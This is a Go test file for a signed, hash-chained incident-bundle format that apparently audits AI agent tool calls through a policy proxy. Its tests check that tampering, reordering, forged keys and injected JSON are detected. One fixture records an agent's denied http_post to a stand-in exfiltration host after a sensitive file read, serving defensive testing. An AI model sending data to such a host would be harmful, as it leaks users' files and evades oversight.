package incidentbundle

import (
	"bytes"
	"crypto"
	"crypto/ed25519"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/themayursinha/mcp-visor/internal/signer"
)

// fixedKey is a deterministic example-only signing key for the checked-in
// fixtures. Fixtures are illustrations, never trust anchors.
type fixedKey struct {
	priv ed25519.PrivateKey
	pub  ed25519.PublicKey
	id   string
}

func exampleSeedKey(t *testing.T) *fixedKey {
	t.Helper()
	seed := make([]byte, ed25519.SeedSize)
	for i := range seed {
		seed[i] = byte(i + 1)
	}
	priv := ed25519.NewKeyFromSeed(seed)
	pub := priv.Public().(ed25519.PublicKey)
	return &fixedKey{priv: priv, pub: pub, id: fmt.Sprintf("key-%s", hex.EncodeToString(pub[:8]))}
}

func (k *fixedKey) Sign(data []byte) ([]byte, error) { return ed25519.Sign(k.priv, data), nil }
func (k *fixedKey) PublicKey() crypto.PublicKey      { return k.pub }
func (k *fixedKey) KeyID() string                    { return k.id }
func (k *fixedKey) Algorithm() string                { return "ed25519" }

func buildAllowBundle(t *testing.T, s *fixedKey) *Bundle {
	t.Helper()
	b := New("exec-allow-001", "policy-sha256:demo", 1788000000)
	mustAppend(t, b, KindRequestedAction, 1788000001, func(ev *Event) {
		ev.Principal = "agent:demo"
		ev.Delegation = []string{"user:mayur"}
		ev.AuthorityRef = "policy:demo-policy#filesystem/file_read"
		ev.Payload = map[string]any{"server": "filesystem", "tool": "file_read", "path": "/home/user/readme.md"}
		ev.RedactionNote = "no patterns matched"
		ev.EvidenceSource = "proxy-request"
	})
	mustAppend(t, b, KindPolicyDecision, 1788000002, func(ev *Event) {
		ev.Payload = map[string]any{"decision": "allow", "rule": "allow_path", "risk": "medium"}
		ev.EvidenceSource = "policy-evaluate"
	})
	mustAppend(t, b, KindRuntimeAttempt, 1788000003, func(ev *Event) {
		ev.Payload = map[string]any{"relayed": true, "transport": "stdio"}
		ev.EvidenceSource = "proxy-relay"
	})
	mustAppend(t, b, KindExternalEffect, 1788000004, func(ev *Event) {
		ev.Payload = map[string]any{"effect": "file bytes returned", "bytes": 42}
		ev.Confirmation = ConfirmationConfirmed
		ev.EvidenceSource = "server-response"
	})
	mustAppend(t, b, KindStateDelta, 1788000005, func(ev *Event) {
		ev.Payload = map[string]any{"taints_added": []string{}}
		ev.EvidenceSource = "session-state"
	})
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	return b
}

func buildDenyBundle(t *testing.T, s *fixedKey) *Bundle {
	t.Helper()
	b := New("exec-deny-003", "policy-sha256:demo", 1788000010)
	mustAppend(t, b, KindRequestedAction, 1788000011, func(ev *Event) {
		ev.Principal = "agent:demo"
		ev.Delegation = []string{"user:mayur"}
		ev.AuthorityRef = "policy:demo-policy#http_post"
		ev.Payload = map[string]any{"server": "net", "tool": "http_post", "url": "https://exfil.invalid/upload"}
		ev.RedactionNote = "no patterns matched"
		ev.EvidenceSource = "proxy-request"
	})
	mustAppend(t, b, KindPolicyDecision, 1788000012, func(ev *Event) {
		ev.Payload = map[string]any{"decision": "deny", "rule": "block_sensitive_egress", "taint": "sensitive_file_accessed"}
		ev.EvidenceSource = "policy-evaluate"
	})
	mustAppend(t, b, KindRuntimeAttempt, 1788000013, func(ev *Event) {
		ev.Payload = map[string]any{"relayed": false, "reason": "denied-before-relay"}
		ev.EvidenceSource = "proxy-relay"
	})
	mustAppend(t, b, KindExternalEffect, 1788000013, func(ev *Event) {
		// The post never reached the server: the independently confirmed
		// external effect is *absence*, recorded by the server observe-log.
		ev.Payload = map[string]any{"effect": "no egress observed", "observed_calls": []string{"file_read#100", "file_read#200"}}
		ev.Confirmation = ConfirmationConfirmed
		ev.EvidenceSource = "server-observe-log"
	})
	mustAppend(t, b, KindStateDelta, 1788000014, func(ev *Event) {
		ev.Payload = map[string]any{"taints_added": []string{"sensitive_file_accessed"}}
		ev.EvidenceSource = "session-state"
	})
	mustAppend(t, b, KindPropagation, 1788000015, func(ev *Event) {
		ev.Payload = map[string]any{"siem_forwarded": true, "receipt": "exec-deny-003"}
		ev.Confirmation = ConfirmationUnconfirmed
		ev.EvidenceSource = "siem-exporter"
	})
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	return b
}

func mustAppend(t *testing.T, b *Bundle, kind string, ts int64, build func(*Event)) {
	t.Helper()
	if err := b.Append(kind, ts, build); err != nil {
		t.Fatal(err)
	}
}

// TestWriteFixtures regenerates examples/incident-bundle/*.json. Run with
// INCIDENT_FIXTURES=write; normal runs only verify the checked-in files.
func TestWriteFixtures(t *testing.T) {
	if os.Getenv("INCIDENT_FIXTURES") != "write" {
		t.Skip("fixture generation opt-in")
	}
	s := exampleSeedKey(t)
	for name, b := range map[string]*Bundle{"allow": buildAllowBundle(t, s), "deny": buildDenyBundle(t, s)} {
		data, err := json.MarshalIndent(b, "", "  ")
		if err != nil {
			t.Fatal(err)
		}
		path := filepath.Join("..", "..", "examples", "incident-bundle", name+".json")
		if err := os.WriteFile(path, append(data, '\n'), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func loadFixture(t *testing.T, name string) *Bundle {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "..", "examples", "incident-bundle", name+".json"))
	if err != nil {
		t.Fatal(err)
	}
	b, err := Unmarshal(data)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func exampleVerifier(t *testing.T, b *Bundle) *signer.ApprovalVerifier {
	t.Helper()
	raw, err := hex.DecodeString(b.Manifest.PublicKey)
	if err != nil {
		t.Fatal(err)
	}
	return signer.NewVerifierFromPublicKey(ed25519.PublicKey(raw))
}

func TestFixturesVerify(t *testing.T) {
	s := exampleSeedKey(t)
	_ = s
	for _, name := range []string{"allow", "deny"} {
		b := loadFixture(t, name)
		if err := b.Verify(exampleVerifier(t, b)); err != nil {
			t.Fatalf("%s fixture: %v", name, err)
		}
		if b.Manifest.SpecVersion != SpecVersion {
			t.Fatalf("%s fixture: spec %q", name, b.Manifest.SpecVersion)
		}
	}
}

func TestTamperPayloadDetected(t *testing.T) {
	b := loadFixture(t, "deny")
	b.Events[1].Payload["decision"] = "allow"
	if err := b.Verify(exampleVerifier(t, b)); err == nil {
		t.Fatal("mutated payload verified: tamper not detected")
	}
}

func TestDropEventDetected(t *testing.T) {
	b := loadFixture(t, "allow")
	b.Events = b.Events[:len(b.Events)-1]
	if err := b.Verify(exampleVerifier(t, b)); err == nil {
		t.Fatal("truncated bundle verified: drop not detected")
	}
}

func TestReorderDetected(t *testing.T) {
	b := loadFixture(t, "allow")
	b.Events[0], b.Events[1] = b.Events[1], b.Events[0]
	if err := b.Verify(exampleVerifier(t, b)); err == nil {
		t.Fatal("reordered bundle verified: reorder not detected")
	}
}

func TestWrongKeyDetected(t *testing.T) {
	b := loadFixture(t, "allow")
	other, err := signer.NewApprovalSigner()
	if err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(other.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("wrong-key bundle verified")
	}
}

func TestAppendAfterSealInvalidates(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildAllowBundle(t, s)
	if err := b.Append(KindPropagation, 1788000006, func(ev *Event) {
		ev.Payload = map[string]any{"note": "late"}
	}); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("post-seal append still verifies")
	}
}

func TestUnknownKindRejected(t *testing.T) {
	b := New("x", "p", 1)
	if err := b.Append("nope", 1, nil); err == nil {
		t.Fatal("unknown kind accepted")
	}
}

func TestPayloadHashMismatchRejected(t *testing.T) {
	b := New("x", "p", 1)
	err := b.Append(KindRequestedAction, 1, func(ev *Event) {
		ev.Payload = map[string]any{"a": 1}
		ev.PayloadHash = "deadbeef"
	})
	if err == nil {
		t.Fatal("mismatched payload_hash accepted")
	}
}

func TestLargeIntegersRoundTrip(t *testing.T) {
	s := exampleSeedKey(t)
	b := New("exec-bigint-001", "policy-sha256:demo", 1788000020)
	mustAppend(t, b, KindRequestedAction, 1788000021, func(ev *Event) {
		// 2^53+1: loses precision as float64; must survive marshal→parse→verify.
		ev.Payload = map[string]any{"execution_id": 9007199254740993}
		ev.EvidenceSource = "proxy-request"
	})
	mustAppend(t, b, KindPolicyDecision, 1788000022, func(ev *Event) {
		ev.Payload = map[string]any{"decision": "allow"}
	})
	mustAppend(t, b, KindRuntimeAttempt, 1788000023, func(ev *Event) {
		ev.Payload = map[string]any{"relayed": true}
	})
	mustAppend(t, b, KindExternalEffect, 1788000024, func(ev *Event) {
		ev.Payload = map[string]any{"effect": "ok"}
		ev.Confirmation = ConfirmationConfirmed
	})
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	data, err := b.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	rt, err := Unmarshal(data)
	if err != nil {
		t.Fatal(err)
	}
	if err := rt.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err != nil {
		t.Fatalf("large-int bundle fails round trip: %v", err)
	}
}

func buildPartialBundle(t *testing.T, s *fixedKey, kinds ...string) *Bundle {
	t.Helper()
	b := New("exec-partial-001", "policy-sha256:demo", 1788000030)
	ts := int64(1788000031)
	for _, k := range kinds {
		mustAppend(t, b, k, ts, func(ev *Event) {
			ev.Payload = map[string]any{"note": k}
			if k == KindExternalEffect {
				ev.Confirmation = ConfirmationConfirmed
			}
		})
		ts++
	}
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	return b
}

func TestPartialEpisodeRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("partial episode verified")
	}
}

func TestSkippedStageRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("stage-skipping episode verified")
	}
}

func TestOutOfOrderEpisodeRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction, KindRuntimeAttempt, KindPolicyDecision, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("out-of-order episode verified")
	}
}

func TestRepeatedEffectAccepted(t *testing.T) {
	// Genuine upgrade: unconfirmed effect (seq 3), then the confirmed record
	// explicitly superseding it.
	s := exampleSeedKey(t)
	b := New("exec-upgrade-001", "policy-sha256:demo", 1788000040)
	ts := int64(1788000041)
	appendStage := func(kind, confirmation string, supersedes *uint64) {
		mustAppend(t, b, kind, ts, func(ev *Event) {
			ev.Payload = map[string]any{"note": kind}
			ev.Confirmation = confirmation
			ev.Supersedes = supersedes
		})
		ts++
	}
	appendStage(KindRequestedAction, "", nil)
	appendStage(KindPolicyDecision, "", nil)
	appendStage(KindRuntimeAttempt, "", nil)
	appendStage(KindExternalEffect, ConfirmationUnconfirmed, nil)
	appendStage(KindStateDelta, "", nil)
	upgradeOf := uint64(3)
	appendStage(KindExternalEffect, ConfirmationConfirmed, &upgradeOf)
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err != nil {
		t.Fatalf("confirmation-upgrade episode rejected: %v", err)
	}
}

func TestUnlinkedRepeatRejected(t *testing.T) {
	// Confirmed repeat naming no target: different effect, not an upgrade.
	s := exampleSeedKey(t)
	b := New("exec-nolink-001", "policy-sha256:demo", 1788000060)
	ts := int64(1788000061)
	stages := []struct {
		kind         string
		confirmation string
	}{
		{KindRequestedAction, ""},
		{KindPolicyDecision, ""},
		{KindRuntimeAttempt, ""},
		{KindExternalEffect, ConfirmationUnconfirmed},
		{KindExternalEffect, ConfirmationConfirmed},
	}
	for _, st := range stages {
		st := st
		mustAppend(t, b, st.kind, ts, func(ev *Event) {
			ev.Payload = map[string]any{"note": "other effect"}
			ev.Confirmation = st.confirmation
		})
		ts++
	}
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("unlinked repeat verified as upgrade")
	}
}

func TestInvalidDigestRejected(t *testing.T) {
	b := New("x", "p", 1)
	err := b.Append(KindRequestedAction, 1, func(ev *Event) {
		ev.PayloadHash = "x"
	})
	if err == nil {
		t.Fatal("non-digest payload_hash accepted by Append")
	}
	s := exampleSeedKey(t)
	hand := &Bundle{Manifest: Manifest{BundleID: "y", SpecVersion: SpecVersion, CreatedAt: 1, PolicyHash: "p"}}
	mustAppend(t, hand, KindRequestedAction, 1, func(ev *Event) {
		ev.Payload = map[string]any{"a": 1}
	})
	mustAppend(t, hand, KindPolicyDecision, 2, func(ev *Event) {
		ev.Payload = map[string]any{"b": 2}
	})
	mustAppend(t, hand, KindRuntimeAttempt, 3, func(ev *Event) {
		ev.Payload = map[string]any{"c": 3}
	})
	mustAppend(t, hand, KindExternalEffect, 4, func(ev *Event) {
		ev.Payload = map[string]any{"d": 4}
		ev.Confirmation = ConfirmationConfirmed
	})
	hand.Events[0].Payload = nil
	hand.Events[0].PayloadHash = "not-a-digest"
	if err := hand.Seal(s); err != nil {
		t.Fatal(err)
	}
	if err := hand.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("non-digest payload_hash verified")
	}
}

func TestNonUpgradeRepeatRejected(t *testing.T) {
	s := exampleSeedKey(t)
	// confirmed effect followed by another confirmed effect: no upgrade.
	b := buildPartialBundle(t, s, KindRequestedAction, KindPolicyDecision, KindRuntimeAttempt, KindExternalEffect, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("non-upgrade repeat verified")
	}
}

func TestEmptyConfirmationRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := New("exec-emptyconf-001", "policy-sha256:demo", 1788000050)
	ts := int64(1788000051)
	for _, k := range []string{KindRequestedAction, KindPolicyDecision, KindRuntimeAttempt} {
		mustAppend(t, b, k, ts, func(ev *Event) {
			ev.Payload = map[string]any{"note": k}
		})
		ts++
	}
	mustAppend(t, b, KindExternalEffect, ts, func(ev *Event) {
		ev.Payload = map[string]any{"note": "no confirmation set"}
	})
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("empty-confirmation effect verified")
	}
}

func TestBuilderFramingRestored(t *testing.T) {
	b := New("x", "p", 1)
	err := b.Append(KindRequestedAction, 42, func(ev *Event) {
		ev.Payload = map[string]any{"a": 1}
		ev.Kind = KindPropagation
		ev.Seq = 99
		ev.PrevHash = "forged"
		ev.Timestamp = 7
	})
	if err != nil {
		t.Fatalf("append with hostile builder failed: %v", err)
	}
	got := b.Events[0]
	if got.Kind != KindRequestedAction || got.Seq != 0 || got.PrevHash != "" || got.Timestamp != 42 {
		t.Fatalf("framing not restored: %+v", got)
	}
}

func TestPrematureStageRejected(t *testing.T) {
	s := exampleSeedKey(t)
	// runtime_attempt before policy_decision, then a repeat to advance:
	// the premature event must still fail the bundle.
	b := buildPartialBundle(t, s, KindRequestedAction, KindRuntimeAttempt, KindPolicyDecision, KindRuntimeAttempt, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("premature-stage episode verified")
	}
}

func TestRepeatedRequiredStageRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction, KindPolicyDecision, KindPolicyDecision, KindRuntimeAttempt, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("repeated required stage verified")
	}
}

func TestUnknownKindInBundleRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction, KindPolicyDecision, KindRuntimeAttempt, KindExternalEffect)
	b.Events[2].Kind = "side_quest"
	// Re-seal over the mutated shape is impossible without the key mutating
	// hashes, so verification must fail at the latest on kind policy.
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("unknown-kind episode verified")
	}
}

func TestBuilderMutatedKindRestored(t *testing.T) {
	// Unknown kinds from the builder are restored to the requested stage,
	// not smuggled through: framing belongs to Append.
	b := New("x", "p", 1)
	err := b.Append(KindRequestedAction, 1, func(ev *Event) {
		ev.Kind = "side_quest"
		ev.Payload = map[string]any{"a": 1}
	})
	if err != nil {
		t.Fatalf("append failed: %v", err)
	}
	if b.Events[0].Kind != KindRequestedAction {
		t.Fatalf("kind not restored: %q", b.Events[0].Kind)
	}
}

func TestTrailingDataRejected(t *testing.T) {
	b := loadFixture(t, "allow")
	data, err := b.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	data = append(data, []byte(`{"injected":true}`)...)
	if _, err := Unmarshal(data); err == nil {
		t.Fatal("trailing data accepted")
	}
}

func TestEvidencelessEventRejected(t *testing.T) {
	// Hand-built bundle bypassing Append: every stage present and chained,
	// but no payload evidence anywhere. Verify must uphold Append's invariant.
	s := exampleSeedKey(t)
	b := &Bundle{Manifest: Manifest{BundleID: "x", SpecVersion: SpecVersion, CreatedAt: 1, PolicyHash: "p"}}
	prev := ""
	for i, k := range []string{KindRequestedAction, KindPolicyDecision, KindRuntimeAttempt, KindExternalEffect} {
		ev := Event{Seq: uint64(i), PrevHash: prev, Kind: k, Timestamp: int64(10 + i)}
		if k == KindExternalEffect {
			ev.Confirmation = ConfirmationConfirmed
		}
		h, err := eventHash(ev)
		if err != nil {
			t.Fatal(err)
		}
		ev.Hash = h
		prev = h
		b.Events = append(b.Events, ev)
	}
	b.Manifest.EventCount = uint64(len(b.Events))
	b.Manifest.HeadHash = prev
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("evidenceless bundle verified")
	}
}

func TestDoubleUpgradeRejected(t *testing.T) {
	// Two confirmed repeats naming the same unconfirmed effect: the second
	// is a double-spend, not an upgrade.
	s := exampleSeedKey(t)
	b := New("exec-double-001", "policy-sha256:demo", 1788000070)
	ts := int64(1788000071)
	appendStage := func(kind, confirmation string, supersedes *uint64) {
		mustAppend(t, b, kind, ts, func(ev *Event) {
			ev.Payload = map[string]any{"note": kind}
			ev.Confirmation = confirmation
			ev.Supersedes = supersedes
		})
		ts++
	}
	appendStage(KindRequestedAction, "", nil)
	appendStage(KindPolicyDecision, "", nil)
	appendStage(KindRuntimeAttempt, "", nil)
	appendStage(KindExternalEffect, ConfirmationUnconfirmed, nil)
	upgradeOf := uint64(3)
	appendStage(KindExternalEffect, ConfirmationConfirmed, &upgradeOf)
	appendStage(KindExternalEffect, ConfirmationConfirmed, &upgradeOf)
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("double-spend upgrade verified")
	}
}

func TestStraySupersedesRejected(t *testing.T) {
	s := exampleSeedKey(t)
	// Supersedes on the first (in-order) effect: unvalidated edge.
	b := New("exec-stray-001", "policy-sha256:demo", 1788000080)
	ts := int64(1788000081)
	mk := func(kind, confirmation string, supersedes *uint64) {
		mustAppend(t, b, kind, ts, func(ev *Event) {
			ev.Payload = map[string]any{"note": kind}
			ev.Confirmation = confirmation
			ev.Supersedes = supersedes
		})
		ts++
	}
	self := uint64(0)
	mk(KindRequestedAction, "", nil)
	mk(KindPolicyDecision, "", nil)
	mk(KindRuntimeAttempt, "", nil)
	mk(KindExternalEffect, ConfirmationConfirmed, &self)
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("stray supersedes verified")
	}
}

func TestUnknownFieldRejected(t *testing.T) {
	b := loadFixture(t, "allow")
	data, err := b.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	// Inject an unsigned top-level claim into the manifest.
	var raw map[string]any
	if err := json.Unmarshal(data, &raw); err != nil {
		t.Fatal(err)
	}
	raw["manifest"].(map[string]any)["reviewer_note"] = "trust me"
	doctored, err := json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Unmarshal(doctored); err == nil {
		t.Fatal("unknown manifest field accepted")
	}
}

func TestDuplicateKeysRejected(t *testing.T) {
	b := loadFixture(t, "allow")
	data, err := b.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	// Conflicting duplicate before the original: last-wins decoders keep
	// the original while first-wins consumers read the forgery.
	forged := bytes.Replace(data, []byte(`"decision":"allow"`), []byte(`"decision":"deny","decision":"allow"`), 1)
	if bytes.Equal(forged, data) {
		t.Skip("fixture shape changed; rewrite injection")
	}
	if _, err := Unmarshal(forged); err == nil {
		t.Fatal("duplicate members accepted")
	}
	// Sanity: distinct keys with equal values are fine.
	if _, err := Unmarshal(data); err != nil {
		t.Fatalf("valid bundle rejected: %v", err)
	}
}

// wrongIDKey reports a key id that does not match its bytes.
type wrongIDKey struct {
	*fixedKey
	id string
}

func (k *wrongIDKey) KeyID() string { return k.id }

func (k *wrongIDKey) Verify(data, sig []byte) error {
	if !ed25519.Verify(k.pub, data, sig) {
		return fmt.Errorf("signature verification failed")
	}
	return nil
}

func TestSignerMetadataBound(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildAllowBundle(t, s)
	v := signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))
	if err := b.Verify(v); err != nil {
		t.Fatalf("control bundle rejected: %v", err)
	}
	if err := b.Verify(&wrongIDKey{fixedKey: s, id: "key-deadbeef"}); err == nil {
		t.Fatal("mismatched key id verified")
	}
	other, err := signer.NewApprovalSigner()
	if err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(other.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("mismatched public key verified")
	}
}

// labeledKey simulates a backend signer (e.g. vault transit) recording its
// own Ed25519 algorithm label.
type labeledKey struct {
	*fixedKey
	label string
}

func (k *labeledKey) Algorithm() string { return k.label }

type labeledVerifier struct {
	pub   ed25519.PublicKey
	id    string
	label string
}

func (v *labeledVerifier) Verify(data, sig []byte) error {
	if !ed25519.Verify(v.pub, data, sig) {
		return fmt.Errorf("signature verification failed")
	}
	return nil
}
func (v *labeledVerifier) PublicKey() crypto.PublicKey { return v.pub }
func (v *labeledVerifier) KeyID() string               { return v.id }
func (v *labeledVerifier) Algorithm() string           { return v.label }

func TestCaseVariantMemberRejected(t *testing.T) {
	b := loadFixture(t, "allow")
	data, err := b.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	forged := bytes.Replace(data, []byte(`"bundle_id"`), []byte(`"BUNDLE_ID"`), 1)
	if bytes.Equal(forged, data) {
		t.Skip("fixture shape changed; rewrite injection")
	}
	if _, err := Unmarshal(forged); err == nil {
		t.Fatal("case-variant member accepted")
	}
	if _, err := Unmarshal(data); err != nil {
		t.Fatalf("valid bundle rejected: %v", err)
	}
}

func TestBackendLabelRoundTrip(t *testing.T) {
	s := exampleSeedKey(t)
	lk := &labeledKey{fixedKey: s, label: "ed25519-vault-transit"}
	b := buildAllowBundle(t, s)
	// Reseal under the backend label.
	if err := b.Seal(lk); err != nil {
		t.Fatal(err)
	}
	match := &labeledVerifier{pub: s.pub, id: s.id, label: "ed25519-vault-transit"}
	if err := b.Verify(match); err != nil {
		t.Fatalf("matching backend label rejected: %v", err)
	}
	// Non-reporting verifier only accepts plain ed25519.
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.pub)); err == nil {
		t.Fatal("backend label accepted by plain verifier")
	}
	// Mismatched reporting label rejects.
	other := &labeledVerifier{pub: s.pub, id: s.id, label: "ed25519-other"}
	if err := b.Verify(other); err == nil {
		t.Fatal("mismatched algorithm label verified")
	}
}

func TestEmptyKeyIDRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildAllowBundle(t, s)
	empty := &labeledVerifier{pub: s.pub, id: "", label: "ed25519"}
	if err := b.Verify(empty); err == nil {
		t.Fatal("empty verifier key id verified")
	}
	b.Manifest.KeyID = ""
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.pub)); err == nil {
		t.Fatal("empty manifest key id verified")
	}
}
